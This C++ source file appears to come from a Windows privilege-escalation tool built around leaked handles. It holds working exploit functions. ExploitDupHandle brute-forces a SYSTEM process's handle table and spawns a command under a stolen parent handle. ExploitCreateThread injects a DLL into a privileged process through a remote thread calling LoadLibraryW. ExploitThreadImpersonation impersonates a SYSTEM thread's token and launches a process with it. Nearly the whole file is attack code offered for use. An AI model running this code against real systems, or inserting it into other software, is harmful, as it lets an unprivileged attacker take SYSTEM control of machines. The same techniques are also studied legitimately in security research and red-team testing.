#include <windows.h>

#include <map>
#include <string>
#include <iostream>
#include <TlHelp32.h>

using namespace std;

DWORD CreatePrivProc(PHANDLE hPrivProc, LPWSTR commandLine) {
	STARTUPINFOEX sinfo = { sizeof(sinfo) };
	PROCESS_INFORMATION pinfo;
	LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
	SIZE_T bytes = 0;

	sinfo.StartupInfo.cb = sizeof(STARTUPINFOEX);
	InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
	if (bytes == 0)
		return FALSE;
	ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)LocalAlloc(LPTR, bytes);
	if (ptList == NULL)
		return false;
	InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);

	UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, hPrivProc, sizeof(HANDLE), NULL, NULL);
	sinfo.lpAttributeList = ptList;

	if (CreateProcess(NULL, commandLine,
		NULL, NULL, TRUE,
		EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
		&sinfo.StartupInfo, &pinfo)) {
		return pinfo.dwProcessId;
	}
	else {
		return 0;
	}
}

BOOL CloneHandle(DWORD ownerPid, HANDLE handle, PHANDLE clonedHandle) {
	HANDLE elevatedToken = NULL;
	HANDLE hOwner = OpenProcess(PROCESS_DUP_HANDLE, false, ownerPid);
	if (hOwner == NULL)
		return FALSE;
	bool result = DuplicateHandle(
		hOwner,
		handle,
		GetCurrentProcess(),
		clonedHandle,
		NULL,
		false,
		DUPLICATE_SAME_ACCESS
	);
	CloseHandle(hOwner);
	return result;
}

// GetTokenIntegrityLevel: query IL directly from a token handle.
// Used for leaked token handles where we don't have (or need) a process handle.
DWORD GetTokenIntegrityLevel(HANDLE hToken) {
	DWORD retLen = 0;
	GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &retLen);
	if (retLen == 0) return 0;
	PTOKEN_MANDATORY_LABEL tml = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, retLen);
	if (!tml) return 0;
	if (!GetTokenInformation(hToken, TokenIntegrityLevel, tml, retLen, &retLen)) {
		LocalFree(tml);
		return 0;
	}
	DWORD il = *GetSidSubAuthority(tml->Label.Sid,
		(DWORD)(UCHAR)(*GetSidSubAuthorityCount(tml->Label.Sid) - 1));
	LocalFree(tml);
	return il;
}

DWORD GetTargetIntegrityLevel(HANDLE hProc) {
	HANDLE hToken;
	if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken))
	{
		CloseHandle(hProc);
		return 0;
	}
	PTOKEN_MANDATORY_LABEL tokenInformation;
	DWORD returnLength;
	DWORD integrityLevel;
	GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &returnLength);
	if (returnLength <= 0) {
		CloseHandle(hToken);
		CloseHandle(hProc);
		return 0;
	}
	tokenInformation = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, returnLength);
	if (!GetTokenInformation(hToken, TokenIntegrityLevel, tokenInformation, returnLength, &returnLength)) {
		LocalFree(tokenInformation);
		CloseHandle(hToken);
		CloseHandle(hProc);
		return 0;
	}
	integrityLevel = *GetSidSubAuthority(tokenInformation->Label.Sid,
		(DWORD)(UCHAR)(*GetSidSubAuthorityCount(tokenInformation->Label.Sid) - 1));
	LocalFree(tokenInformation);
	CloseHandle(hToken);
	CloseHandle(hProc);
	return integrityLevel;
}

DWORD GetTargetIntegrityLevel(DWORD pid) {
	HANDLE hProc;
	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (hProc == NULL)
		return 0;
	return GetTargetIntegrityLevel(hProc);
}

// ExploitDupHandle: given a handle to a SYSTEM process with PROCESS_DUP_HANDLE rights,
// brute-forces the target's handle table to steal a privileged process handle,
// then uses CreatePrivProc to spawn commandLine in that elevated context.
DWORD ExploitDupHandle(HANDLE hProc, LPWSTR commandLine) {
	// Handle values in Windows are multiples of 4 starting at 4.
	// SYSTEM processes commonly hold a self-handle and handles to other SYSTEM processes
	// at low handle values, so 0x1000 covers the vast majority of cases.
	for (ULONG_PTR handleVal = 4; handleVal < 0x1000; handleVal += 4) {
		HANDLE hStolen = NULL;

		// Steal the handle at this slot with DUPLICATE_SAME_ACCESS so we get
		// whatever rights the target already has on that object.
		if (!DuplicateHandle(hProc, (HANDLE)handleVal, GetCurrentProcess(),
			&hStolen, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
			continue;
		}

		// Filter: is this a process handle?
		DWORD pid = GetProcessId(hStolen);
		if (pid == 0) {
			CloseHandle(hStolen);
			continue;
		}

		// Filter: is the target process running at High or SYSTEM integrity?
		DWORD il = GetTargetIntegrityLevel(pid);
		if (il < SECURITY_MANDATORY_HIGH_RID && GetLastError() != ERROR_ACCESS_DENIED) {
			CloseHandle(hStolen);
			continue;
		}

		std::cout << "[+] ExploitDupHandle: stolen process handle 0x" << std::hex << handleVal
			<< " -> PID " << std::dec << pid
			<< " (IL: 0x" << std::hex << il << "), spawning...\n";

		DWORD privPid = CreatePrivProc(&hStolen, commandLine);
		CloseHandle(hStolen);
		if (privPid != 0)
			return privPid;

		std::cerr << "[-] CreatePrivProc failed for handle 0x" << std::hex << handleVal
			<< " (error: " << std::dec << GetLastError() << ")\n";
	}
	return 0;
}

// ExploitCreateThread: given a SYSTEM process handle with PROCESS_CREATE_THREAD
// (and implicitly PROCESS_VM_OPERATION + PROCESS_VM_WRITE for VirtualAllocEx /
// WriteProcessMemory), injects dllPath into the target via LoadLibraryW.
// The DLL's DllMain is responsible for spawning the privileged payload.
// LoadLibraryW is resolved locally — per-boot ASLR keeps kernel32 at the same
// base address in every process within a Windows session.
DWORD ExploitCreateThread(HANDLE hProc, LPWSTR dllPath) {
	LPVOID loadLibW = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32"), "LoadLibraryW");
	if (!loadLibW) {
		std::cerr << "[-] Failed to resolve LoadLibraryW\n";
		return 0;
	}

	SIZE_T pathBytes = (wcslen(dllPath) + 1) * sizeof(WCHAR);

	// Allocate a readable page in the target for the DLL path string
	LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, pathBytes,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteBuf) {
		std::cerr << "[-] VirtualAllocEx failed (need PROCESS_VM_OPERATION): "
			<< std::dec << GetLastError() << "\n";
		return 0;
	}

	if (!WriteProcessMemory(hProc, remoteBuf, dllPath, pathBytes, NULL)) {
		std::cerr << "[-] WriteProcessMemory failed: " << std::dec << GetLastError() << "\n";
		VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
		return 0;
	}

	std::cout << "[+] DLL path written to target at 0x" << std::hex << (uintptr_t)remoteBuf
		<< ", creating remote thread -> LoadLibraryW...\n";

	DWORD tid = 0;
	HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0,
		(LPTHREAD_START_ROUTINE)loadLibW, remoteBuf, 0, &tid);
	if (!hRemote) {
		std::cerr << "[-] CreateRemoteThread failed: " << std::dec << GetLastError() << "\n";
		VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
		return 0;
	}

	std::cout << "[+] Remote thread TID " << std::dec << tid << ", waiting for DLL load...\n";
	WaitForSingleObject(hRemote, 5000);

	DWORD exitCode = 0;
	GetExitCodeThread(hRemote, &exitCode);
	CloseHandle(hRemote);
	VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);

	if (exitCode == 0) {
		std::cerr << "[-] LoadLibraryW returned NULL — DLL load failed or path invalid\n";
		return 0;
	}

	// exitCode is the HMODULE of the loaded DLL — non-zero means success
	std::cout << "[+] DLL loaded (HMODULE: 0x" << std::hex << exitCode << ")\n";
	return tid;
}

// NtImpersonateThread: undocumented API — impersonates the security context of
// ThreadToImpersonate on ThreadHandle. Requires THREAD_DIRECT_IMPERSONATION on
// the target thread.
typedef NTSTATUS(WINAPI* fNtImpersonateThread)(
	HANDLE ThreadHandle,
	HANDLE ThreadToImpersonate,
	PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService
);

// ExploitThreadImpersonation: given a SYSTEM thread handle with
// THREAD_DIRECT_IMPERSONATION rights, impersonates its token on the calling thread,
// promotes to a primary token, and spawns commandLine via CreateProcessWithTokenW.
DWORD ExploitThreadImpersonation(HANDLE hThread, LPWSTR commandLine) {
	fNtImpersonateThread NtImpersonateThread =
		(fNtImpersonateThread)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtImpersonateThread");
	if (!NtImpersonateThread) {
		std::cerr << "[-] Failed to resolve NtImpersonateThread\n";
		return 0;
	}

	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	sqos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
	sqos.EffectiveOnly = FALSE;

	NTSTATUS status = NtImpersonateThread(GetCurrentThread(), hThread, &sqos);
	if (status != 0) {
		std::cerr << "[-] NtImpersonateThread failed: 0x" << std::hex << status << "\n";
		return 0;
	}

	std::cout << "[+] Impersonating target thread token...\n";

	// Grab the impersonation token now sitting on our thread
	HANDLE hImpToken = NULL;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &hImpToken)) {
		std::cerr << "[-] OpenThreadToken failed: " << std::dec << GetLastError() << "\n";
		RevertToSelf();
		return 0;
	}

	// Promote to a primary token so CreateProcessWithTokenW can use it
	HANDLE hPrimary = NULL;
	if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL,
		SecurityImpersonation, TokenPrimary, &hPrimary)) {
		std::cerr << "[-] DuplicateTokenEx failed: " << std::dec << GetLastError() << "\n";
		CloseHandle(hImpToken);
		RevertToSelf();
		return 0;
	}
	CloseHandle(hImpToken);

	// Spawn while still impersonating so SE_IMPERSONATE_PRIVILEGE is present on the thread
	STARTUPINFOW si = { sizeof(si) };
	PROCESS_INFORMATION pi = {};
	DWORD pid = 0;

	if (CreateProcessWithTokenW(hPrimary, LOGON_WITH_PROFILE, NULL,
		commandLine, 0, NULL, NULL, &si, &pi)) {
		pid = pi.dwProcessId;
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else {
		std::cerr << "[-] CreateProcessWithTokenW failed: " << std::dec << GetLastError() << "\n";
	}

	CloseHandle(hPrimary);
	RevertToSelf();
	return pid;
}

wstring GetProcName(DWORD pid)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);
	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		return wstring();
	}

	for (BOOL bok = Process32First(processesSnapshot, &processInfo); bok; bok = Process32Next(processesSnapshot, &processInfo))
	{
		if (pid == processInfo.th32ProcessID)
		{
			CloseHandle(processesSnapshot);
			return processInfo.szExeFile;
		}

	}
	CloseHandle(processesSnapshot);
	return wstring();
}